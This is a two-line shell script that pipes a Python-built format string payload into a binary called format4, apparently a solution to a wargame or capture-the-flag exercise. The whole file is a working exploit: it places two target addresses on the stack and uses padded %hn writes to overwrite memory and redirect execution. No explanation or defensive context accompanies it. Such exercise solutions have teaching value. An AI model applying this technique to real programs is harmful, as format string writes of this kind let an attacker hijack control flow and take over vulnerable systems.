#! /bin/sh
python -c "print '\x1e\xa0\x04\x08'+'\x1c\xa0\x04\x08'+'%2044x'+'%4\$hn'+'%31975x'+'%5\$hn'" | ./format4
